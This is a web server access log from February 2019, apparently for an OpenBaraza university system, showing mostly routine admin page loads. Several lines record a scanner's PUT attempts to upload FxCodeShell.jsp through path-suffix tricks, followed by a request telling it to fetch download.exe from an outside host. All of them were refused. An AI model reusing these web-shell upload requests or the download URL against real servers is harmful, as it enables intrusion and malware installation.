190.114.239.88 - - [12/Feb/2019:01:08:45 +0300] "GET / HTTP/1.1" 200 32966
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/jquery-file-upload/css/jquery.fileupload.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/admin/layout4/css/layout.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/jquery-ui/jquery-ui-1.10.3.custom.min.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/admin/layout4/css/themes/light.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/css/plugins.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/jqgrid/css/ui.jqgrid.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/jsgrid/jsgrid.min.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/admin/layout4/css/custom.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/jsgrid/jsgrid-theme.min.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/jquery-migrate.min.js HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/jquery-slimscroll/jquery.slimscroll.min.js HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/uniform/jquery.uniform.min.js HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/global/plugins/jquery.blockui.min.js HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:37 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_100_f6f6f6_1x400.png HTTP/1.1" 200 262
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-icons_ef8c08_256x240.png HTTP/1.1" 200 4549
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-icons_222222_256x240.png HTTP/1.1" 200 6922
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-icons_ffffff_256x240.png HTTP/1.1" 200 6299
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_gloss-wave_35_f6a828_500x100.png HTTP/1.1" 200 5815
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_65_ffffff_1x400.png HTTP/1.1" 200 207
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/global/plugins/uniform/images/sprite.png HTTP/1.1" 200 31815
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/assets/logos/favicon.png HTTP/1.1" 200 4035
10.16.13.15 - rootadmin [12/Feb/2019:11:46:38 +0300] "GET /aua/jsondata?_search=false&nd=1549949782076&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:46:39 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_100_fdf5ce_1x400.png HTTP/1.1" 200 348
10.16.13.15 - rootadmin [12/Feb/2019:11:46:40 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_highlight-soft_75_ffe45c_1x100.png HTTP/1.1" 200 328
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/c_umis.jsp?view=157:0:0&data=1487 HTTP/1.1" 200 65181
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/jqvmap/jqvmap/jqvmap.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/bootstrap-daterangepicker/daterangepicker-bs3.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/uniform/css/uniform.default.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/bootstrap-switch/css/bootstrap-switch.min.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/morris/morris.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/admin/pages/css/tasks.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:41 +0300] "GET /aua/assets/global/plugins/clockface/css/clockface.css HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:46:50 +0300] "GET /aua/c_umis.jsp?view=157:0:1&data=1487 HTTP/1.1" 200 72062
10.16.13.15 - - [12/Feb/2019:11:47:03 +0300] "GET /favicon.ico HTTP/1.1" 404 1085
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/c_umis.jsp?view=157:0&data= HTTP/1.1" 200 68127
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/global/plugins/bootstrap-colorpicker/css/colorpicker.css HTTP/1.1" 200 2412
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/global/plugins/bootstrap-datetimepicker/css/bootstrap-datetimepicker.min.css HTTP/1.1" 200 9444
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/global/plugins/jqvmap/jqvmap/jqvmap.css HTTP/1.1" 200 907
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 200 10067
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/global/plugins/jquery-tags-input/jquery.tagsinput.css HTTP/1.1" 200 904
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/global/css/plugins.css HTTP/1.1" 200 50628
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/admin/pages/css/profile.css HTTP/1.1" 200 2679
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/admin/layout4/css/layout.css HTTP/1.1" 200 50717
10.16.13.15 - rootadmin [12/Feb/2019:11:47:05 +0300] "GET /aua/assets/admin/layout4/css/themes/light.css HTTP/1.1" 200 20275
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_100_f6f6f6_1x400.png HTTP/1.1" 200 262
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-icons_ef8c08_256x240.png HTTP/1.1" 200 4549
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-icons_222222_256x240.png HTTP/1.1" 200 6922
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-icons_ffffff_256x240.png HTTP/1.1" 200 6299
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_gloss-wave_35_f6a828_500x100.png HTTP/1.1" 200 5815
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_65_ffffff_1x400.png HTTP/1.1" 200 207
10.16.13.15 - rootadmin [12/Feb/2019:11:47:06 +0300] "GET /aua/jsondata?_search=false&nd=1549949810211&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:47:07 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_100_fdf5ce_1x400.png HTTP/1.1" 200 348
10.16.13.15 - rootadmin [12/Feb/2019:11:47:12 +0300] "GET /aua/c_umis.jsp?view=157:0 HTTP/1.1" 200 68127
10.16.13.15 - rootadmin [12/Feb/2019:11:47:12 +0300] "GET /aua/assets/global/plugins/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
10.16.13.15 - rootadmin [12/Feb/2019:11:47:12 +0300] "GET /aua/assets/global/plugins/uniform/css/uniform.default.css HTTP/1.1" 200 10851
10.16.13.15 - rootadmin [12/Feb/2019:11:47:12 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:47:13 +0300] "GET /aua/jsondata?_search=false&nd=1549949816824&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:47:13 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_100_fdf5ce_1x400.png HTTP/1.1" 304 -
10.16.13.15 - rootadmin [12/Feb/2019:11:47:29 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_highlight-soft_75_ffe45c_1x100.png HTTP/1.1" 200 328
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/c_umis.jsp?view=157:0:0&data=1433 HTTP/1.1" 200 65908
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 200 10067
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/jqvmap/jqvmap/jqvmap.css HTTP/1.1" 200 907
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/morris/morris.css HTTP/1.1" 200 433
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/clockface/css/clockface.css HTTP/1.1" 200 5861
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/admin/pages/css/tasks.css HTTP/1.1" 200 1809
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/bootstrap-datepicker/css/bootstrap-datepicker3.min.css HTTP/1.1" 200 31438
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/bootstrap-datetimepicker/css/bootstrap-datetimepicker.min.css HTTP/1.1" 200 9444
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/bootstrap-colorpicker/css/colorpicker.css HTTP/1.1" 200 2412
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/jquery-tags-input/jquery.tagsinput.css HTTP/1.1" 200 904
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/jquery-multi-select/css/multi-select.css HTTP/1.1" 200 2425
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/select2/select2.css HTTP/1.1" 200 18705
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/bootstrap-toastr/toastr.min.css HTTP/1.1" 200 5620
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/bootstrap-fileinput/bootstrap-fileinput.css HTTP/1.1" 200 2484
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/admin/pages/css/profile.css HTTP/1.1" 200 2679
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/jquery-file-upload/css/jquery.fileupload.css HTTP/1.1" 200 655
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/css/plugins.css HTTP/1.1" 200 50628
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/jqgrid/css/ui.jqgrid.css HTTP/1.1" 200 10655
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/jsgrid/jsgrid.min.css HTTP/1.1" 200 1802
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/jstree/dist/themes/default/style.min.css HTTP/1.1" 200 23030
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/jsgrid/jsgrid-theme.min.css HTTP/1.1" 200 33450
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/admin/layout4/css/custom.css HTTP/1.1" 200 9646
10.16.13.15 - rootadmin [12/Feb/2019:11:47:30 +0300] "GET /aua/assets/global/plugins/bootstrap-timepicker/css/bootstrap-timepicker.min.css HTTP/1.1" 200 3061
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "POST /aua/c_umis.jsp HTTP/1.1" 200 65908
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/simple-line-icons/simple-line-icons.min.css HTTP/1.1" 200 9562
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/bootstrap-daterangepicker/daterangepicker-bs3.css HTTP/1.1" 200 5665
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/admin/pages/css/tasks.css HTTP/1.1" 200 1809
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/morris/morris.css HTTP/1.1" 200 433
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/clockface/css/clockface.css HTTP/1.1" 200 5861
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/bootstrap-datepicker/css/bootstrap-datepicker3.min.css HTTP/1.1" 200 31438
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/uniform/css/uniform.default.css HTTP/1.1" 200 10851
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/css/plugins.css HTTP/1.1" 200 50628
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/admin/pages/css/profile.css HTTP/1.1" 200 2679
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/jstree/dist/themes/default/style.min.css HTTP/1.1" 200 23030
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/jquery-file-upload/css/jquery.fileupload.css HTTP/1.1" 200 655
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 200 10067
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/bootstrap-toastr/toastr.min.css HTTP/1.1" 200 5620
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/jqvmap/jqvmap/jqvmap.css HTTP/1.1" 200 907
10.16.13.15 - rootadmin [12/Feb/2019:11:47:36 +0300] "GET /aua/assets/global/plugins/bootstrap-fileinput/bootstrap-fileinput.css HTTP/1.1" 200 2484
10.16.13.15 - rootadmin [12/Feb/2019:11:47:41 +0300] "GET /aua/c_umis.jsp?view=157:0:1&data=1433 HTTP/1.1" 200 74618
10.16.13.15 - rootadmin [12/Feb/2019:11:47:46 +0300] "GET /aua/c_umis.jsp?view=157:0:0&data=1433 HTTP/1.1" 200 65908
10.16.13.15 - rootadmin [12/Feb/2019:11:47:46 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 200 10067
10.16.13.15 - rootadmin [12/Feb/2019:11:47:53 +0300] "GET /aua/c_umis.jsp?view=157:0&data= HTTP/1.1" 200 68127
10.16.13.15 - rootadmin [12/Feb/2019:11:47:53 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 200 10067
10.16.13.15 - rootadmin [12/Feb/2019:11:47:53 +0300] "GET /aua/assets/global/plugins/jqvmap/jqvmap/jqvmap.css HTTP/1.1" 200 907
10.16.13.15 - rootadmin [12/Feb/2019:11:47:53 +0300] "GET /aua/assets/global/plugins/clockface/css/clockface.css HTTP/1.1" 200 5861
10.16.13.15 - rootadmin [12/Feb/2019:11:47:53 +0300] "GET /aua/assets/admin/pages/css/tasks.css HTTP/1.1" 200 1809
10.16.13.15 - rootadmin [12/Feb/2019:11:47:53 +0300] "GET /aua/assets/global/plugins/morris/morris.css HTTP/1.1" 200 433
10.16.13.15 - rootadmin [12/Feb/2019:11:47:54 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:47:54 +0300] "GET /aua/jsondata?_search=false&nd=1549949858305&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:47:54 +0300] "GET /aua/assets/global/plugins/jquery-ui/images/ui-bg_glass_100_fdf5ce_1x400.png HTTP/1.1" 200 348
10.16.13.15 - rootadmin [12/Feb/2019:11:48:00 +0300] "GET /aua/c_umis.jsp?view=157:0:0&data=1456 HTTP/1.1" 200 65187
10.16.13.15 - rootadmin [12/Feb/2019:11:48:00 +0300] "GET /aua/assets/global/plugins/fullcalendar/fullcalendar.min.css HTTP/1.1" 200 10067
10.16.13.15 - rootadmin [12/Feb/2019:11:48:18 +0300] "GET /aua/assets/admin/layout4/img/sidebar-toggle-light.png HTTP/1.1" 200 965
10.16.13.15 - rootadmin [12/Feb/2019:11:48:36 +0300] "GET /aua/c_umis.jsp?view=157:0&data= HTTP/1.1" 200 68127
10.16.13.15 - rootadmin [12/Feb/2019:11:48:36 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:48:37 +0300] "GET /aua/jsondata?_search=false&nd=1549949900913&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:48:41 +0300] "GET /aua/c_umis.jsp?view=157:0&data= HTTP/1.1" 200 68127
10.16.13.15 - rootadmin [12/Feb/2019:11:48:41 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:48:41 +0300] "GET /aua/jsondata?_search=false&nd=1549949905683&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:48:51 +0300] "GET /aua/c_umis.jsp?view=320:0 HTTP/1.1" 200 68191
10.16.13.15 - rootadmin [12/Feb/2019:11:48:52 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:48:52 +0300] "GET /aua/jsondata?_search=false&nd=1549949916384&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:49:18 +0300] "GET /aua/c_umis.jsp?view=320:0:0&data=1456 HTTP/1.1" 200 75885
10.16.13.15 - rootadmin [12/Feb/2019:11:49:26 +0300] "POST /aua/c_umis.jsp HTTP/1.1" 200 69219
10.16.13.15 - rootadmin [12/Feb/2019:11:49:49 +0300] "GET /aua/c_umis.jsp?view=319:0 HTTP/1.1" 200 68119
10.16.13.15 - rootadmin [12/Feb/2019:11:49:49 +0300] "GET /aua/assets/admin/layout4/css/images/ui-bg_highlight-soft_100_eeeeee_1x100.png HTTP/1.1" 404 1175
10.16.13.15 - rootadmin [12/Feb/2019:11:49:50 +0300] "GET /aua/jsondata?_search=false&nd=1549949973820&rows=30&page=1&sidx=&sord=asc HTTP/1.1" 200 216977
10.16.13.15 - rootadmin [12/Feb/2019:11:49:56 +0300] "GET /aua/c_umis.jsp?view=319:0:0&data=5 HTTP/1.1" 200 73724
10.16.13.15 - rootadmin [12/Feb/2019:11:50:10 +0300] "POST /aua/c_umis.jsp HTTP/1.1" 200 73724
62.4.14.198 - - [12/Feb/2019:11:54:52 +0300] "GET / HTTP/1.1" 200 32966
180.169.178.90 - - [12/Feb/2019:12:13:34 +0300] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 403 15562
180.169.178.90 - - [12/Feb/2019:12:13:35 +0300] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 403 15562
180.169.178.90 - - [12/Feb/2019:12:13:36 +0300] "PUT /FxCodeShell.jsp/ HTTP/1.1" 403 15562
180.169.178.90 - - [12/Feb/2019:12:13:37 +0300] "GET /FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http://a46.bulehero.in/download.exe HTTP/1.1" 404 1089
10.16.13.109 - - [12/Feb/2019:12:44:20 +0300] "GET /assets/css/base.css HTTP/1.1" 200 1182
10.16.13.109 - - [12/Feb/2019:12:44:20 +0300] "GET / HTTP/1.1" 200 32966
10.16.13.109 - - [12/Feb/2019:12:44:20 +0300] "GET /assets/css/bootstrap.min.css HTTP/1.1" 200 122544
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/responsive.css HTTP/1.1" 200 4318
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/fonts/proxima/fonts.min.css HTTP/1.1" 200 3326
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/menu.css HTTP/1.1" 200 8371
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/animate.min.css HTTP/1.1" 200 53436
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/style.css HTTP/1.1" 200 34247
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/fonts/elegant_font/elegant_font.min.css HTTP/1.1" 200 21750
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/fonts/icon_font/pe-icon-7-stroke.min.css HTTP/1.1" 200 11124
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/fonts/fontella/css/fontello.min.css HTTP/1.1" 200 105208
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/fonts/edu_fonts/edu_fonts.min.css HTTP/1.1" 200 1781
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/magnific-popup.css HTTP/1.1" 200 10118
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/custom.css HTTP/1.1" 200 25
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/tabs.css HTTP/1.1" 200 3424
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/jquery-1.11.2.min.js HTTP/1.1" 200 95939
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/layerslider/css/layerslider.css HTTP/1.1" 200 15822
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/common_scripts_min.js HTTP/1.1" 200 158663
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/css/register/custom.css HTTP/1.1" 200 2245
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/functions.js HTTP/1.1" 200 5604
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/plugins/register/jquery.qtip.custom/jquery.qtip.min.css HTTP/1.1" 200 8982
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/layerslider/js/greensock.js HTTP/1.1" 200 53041
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/validate.js HTTP/1.1" 200 15132
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/layerslider/js/layerslider.transitions.js HTTP/1.1" 200 21111
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /assets/js/layerslider/js/layerslider.kreaturamedia.jquery.js HTTP/1.1" 200 56437
10.16.13.109 - - [12/Feb/2019:12:44:21 +0300] "GET /layerslider/skins/v5/skin.css HTTP/1.1" 200 3146
10.16.13.109 - - [12/Feb/2019:12:44:22 +0300] "GET /assets/js/tabs.js HTTP/1.1" 200 2063
10.16.13.109 - - [12/Feb/2019:12:44:23 +0300] "GET /assets/img/logo/openbaraza-logo.png HTTP/1.1" 200 13119
10.16.13.109 - - [12/Feb/2019:12:44:23 +0300] "GET /assets/img/slides/slide_1.jpg HTTP/1.1" 200 96150
10.16.13.109 - - [12/Feb/2019:12:44:24 +0300] "GET /assets/plugins/register/jquery.qtip.custom/jquery.qtip.js HTTP/1.1" 200 102744
10.16.13.109 - - [12/Feb/2019:12:44:24 +0300] "GET /assets/img/slides/slide_2.jpg HTTP/1.1" 200 104154
10.16.13.109 - - [12/Feb/2019:12:44:24 +0300] "GET /assets/img/slides/slide_3.jpg HTTP/1.1" 200 127233
10.16.13.109 - - [12/Feb/2019:12:44:25 +0300] "GET /assets/img/slides/slide_4.jpg HTTP/1.1" 200 67452
10.16.13.109 - - [12/Feb/2019:12:44:26 +0300] "GET /img/event_1_thumb.jpg HTTP/1.1" 404 1099
10.16.13.109 - - [12/Feb/2019:12:44:26 +0300] "GET /img/event_2_thumb.jpg HTTP/1.1" 404 1099
10.16.13.109 - - [12/Feb/2019:12:44:26 +0300] "GET /img/event_3_thumb.jpg HTTP/1.1" 404 1099
10.16.13.109 - - [12/Feb/2019:12:44:26 +0300] "GET /assets/img/graphic.jpg HTTP/1.1" 200 61403
